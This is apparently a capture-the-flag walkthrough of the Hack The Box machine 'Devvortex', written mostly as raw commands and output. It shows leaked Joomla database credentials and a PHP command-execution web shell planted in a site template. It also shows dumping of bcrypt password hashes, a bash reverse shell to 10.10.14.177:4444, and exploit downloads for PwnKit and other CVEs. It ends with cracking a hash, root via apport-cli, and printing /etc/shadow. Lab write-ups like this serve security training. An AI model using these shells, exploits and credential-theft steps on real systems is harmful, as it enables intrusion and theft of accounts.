# Devvortex

```bash
Visit machine ip: 10.10.11.242
Follow a redirect to: devvortex.htb but its not working
```

```bash
add domain devvortex.htb to hosts dns file
nano /etc/hosts
10.10.11.242	devvortex.htb
```

```bash
only html/css/js static code
nmap nothing than 80 and ssh, cant detect vulns working
```

```bash
Scan for other hidden vhost domains
https://github.com/OJ/gobuster/releases

./gobuster vhost -u devvortex.htb -t 50 -w ../subdomains-top1million-5000.txt --append-domain

Found: dev.devvortex.htb
```

```bash
add domain dev.devvortex.htb to hosts dns file
nano /etc/hosts
10.10.11.242	dev.devvortex.htb devvortex.htb
```

```bash
on http://dev.devvortex.htb/administrator/ Joomla detected!

gem install httpx
gem install docopt
gem install paint
ruby joomla.rb http://dev.devvortex.htb
	Users
	[649] lewis (lewis) - lewis@devvortex.htb - Super Users
	[650] logan paul (logan) - logan@devvortex.htb - Registered

	Site info
	Site name: Development
	Editor: tinymce
	Captcha: 0
	Access: 1
	Debug status: false
	
	Database info
	DB type: mysqli
	DB host: localhost
	DB user: lewis
	DB password: P4ntherg0t1n5r3c0n##
	DB name: joomla
	DB prefix: sd4fg_
	DB encryption 0
```

```bash
Login into http://dev.devvortex.htb/administrator/ as:
	lewis
	P4ntherg0t1n5r3c0n##
```

```bash
System->Site Templates->Cassiopeia Details and Files
http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=aG9tZQ==

Add at the top of offline.php
	if (isset($_GET["cmd"])){
	  system($_GET['cmd']);
	}

And visit it...
	http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=ls

Dump all database users... Edit offline.php again...
	error_reporting(E_ALL);
	ini_set('display_errors', 1);
	
	$dbhandle = mysqli_connect("localhost", "lewis", "P4ntherg0t1n5r3c0n##", "joomla");
	$result = mysqli_query($dbhandle, "SELECT * from sd4fg_users");
	
	while ($row = mysqli_fetch_array($result)) {
		var_dump($row);
	}

And visit it...
	http://dev.devvortex.htb/templates/cassiopeia/offline.php

	array(34) { [0]=> string(3) "649" ["id"]=> string(3) "649" [1]=> string(5) "lewis" ["name"]=> string(5) "lewis" [2]=> string(5) "lewis" ["username"]=> string(5) "lewis" [3]=> string(19) "lewis@devvortex.htb" ["email"]=> string(19) "lewis@devvortex.htb" [4]=> string(60) "$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u" ["password"]=> string(60) "$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u" [5]=> string(1) "0" ["block"]=> string(1) "0" [6]=> string(1) "1" ["sendEmail"]=> string(1) "1" [7]=> string(19) "2023-09-25 16:44:24" ["registerDate"]=> string(19) "2023-09-25 16:44:24" [8]=> string(19) "2023-11-29 14:24:28" ["lastvisitDate"]=> string(19) "2023-11-29 14:24:28" [9]=> string(1) "0" ["activation"]=> string(1) "0" [10]=> string(0) "" ["params"]=> string(0) "" [11]=> NULL ["lastResetTime"]=> NULL [12]=> string(1) "0" ["resetCount"]=> string(1) "0" [13]=> string(0) "" ["otpKey"]=> string(0) "" [14]=> string(0) "" ["otep"]=> string(0) "" [15]=> string(1) "0" ["requireReset"]=> string(1) "0" [16]=> string(0) "" ["authProvider"]=> string(0) "" } array(34) { [0]=> string(3) "650" ["id"]=> string(3) "650" [1]=> string(10) "logan paul" ["name"]=> string(10) "logan paul" [2]=> string(5) "logan" ["username"]=> string(5) "logan" [3]=> string(19) "logan@devvortex.htb" ["email"]=> string(19) "logan@devvortex.htb" [4]=> string(60) "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" ["password"]=> string(60) "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" [5]=> string(1) "0" ["block"]=> string(1) "0" [6]=> string(1) "0" ["sendEmail"]=> string(1) "0" [7]=> string(19) "2023-09-26 19:15:42" ["registerDate"]=> string(19) "2023-09-26 19:15:42" [8]=> NULL ["lastvisitDate"]=> NULL [9]=> string(0) "" ["activation"]=> string(0) "" [10]=> string(151) "{"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}" ["params"]=> string(151) "{"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}" [11]=> NULL ["lastResetTime"]=> NULL [12]=> string(1) "0" ["resetCount"]=> string(1) "0" [13]=> string(0) "" ["otpKey"]=> string(0) "" [14]=> string(0) "" ["otep"]=> string(0) "" [15]=> string(1) "0" ["requireReset"]=> string(1) "0" [16]=> string(0) "" ["authProvider"]=> string(0) "" }

	lewis
	$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u

	logan
	$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

	Crack joomla password (bcrypt)
	https://hashcat.net/forum/thread-10645.html
```

```bash
try get a better shell

<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.177/4444 0>&1'");

nc -lvp 4444
```

```bash
mysql -u lewis -pP4ntherg0t1n5r3c0n## -e 'SELECT User, Host, authentication_string FROM mysql.user;'
ERROR 1142 (42000) at line 1: SELECT command denied to user 'lewis'@'localhost' for table 'user'
Cant get more users and passwords...
```

```bash
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.6 LTS
Release:	20.04
Codename:	focal
```

```bash
Try LinEnum, Linux Exploit Suggester, Linux Priv Checker, Linux Smart Enumeration, LinPeas

Outputs: LinEnum.txt, les.txt, lse.txt, linpeas.txt
https://ed4m4s.blog/privilege-escalation/linux/linprivesc
```

```bash
les.txt - CVE-2021-4034
	Get glibc version
	ldd --version

	git clone https://github.com/berdav/CVE-2021-4034
	cd CVE-2021-4034
	zig cc -target x86_64-linux-gnu.2.31 -Wall --shared -fPIC -o pwnkit.so pwnkit.c
	{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <pwnkit.so)\r\n\r\n"; cat pwnkit.so; } | nc -l 4445

	wget "http://10.10.14.177:4445"
	mv index.html pwnkit.so

	zig cc -target x86_64-linux-gnu.2.31 -Wall    cve-2021-4034.c   -o cve-2021-4034
	{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <cve-2021-4034)\r\n\r\n"; cat cve-2021-4034; } | nc -l 4445

	wget "http://10.10.14.177:4445"
	mv index.html cve-2021-4034
	echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
	mkdir -p GCONV_PATH=.
	cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
	chmod +x cve-2021-4034
	./cve-2021-4034

	GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”

```

```bash
les.txt - CVE-2021-3156
	https://github.com/blasty/CVE-2021-3156

	GNU parallel not installed

	https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py	

	AssertionError: target is patched
```

```bash
les.txt - CVE-2021-22555
	wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
	zig cc -target x86_64-linux-gnu.2.31 exploit.c
	{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <exploit)\r\n\r\n"; cat exploit; } | nc -l 4445

	wget "http://10.10.14.177:4445"
	mv index.html exploit
	chmod +x exploit
	./exploit

	[-] unshare(CLONE_NEWUSER): Operation not permitted

```

```bash
linpeas.txt - sudo = 1.8.31
	https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
```

```bash
Brute force hash ?

	hashcat -m 3200 "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" -a 0 rockyou.txt

	$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

	ssh logan@devvortex.htb
	tequieromucho

	cat /home/logan/user.txt
	ac1b6a2b402cdfa04a15be3c61cd01e5

```

```bash
linpeas.txt - "Do not forget to execute 'sudo -l' without password or with valid"
	sudo -l
	User logan may run the following commands on devvortex:
		(ALL : ALL) /usr/bin/apport-cli

	https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e00

	less /etc/profile
	!/bin/sh

	sudo /usr/bin/apport-cli --file-bug
	1
	2
	ENTER
	V

	!/bin/bash

	cat /etc/shadow
	root:$6$kdYdkbdlt4MMS7Qx$/lIiEByq.cgsQPyd82QDfhA/Qb5IgaukiUN0OOKewugqr1qeFFiQ4t2sAdiyAmUssoeg3.h1k/2BpdTRthmum.:19654:0:99999:7:::

	cat /root/root.txt 
	cfb343c3b91503a88b509b6125d83f52
```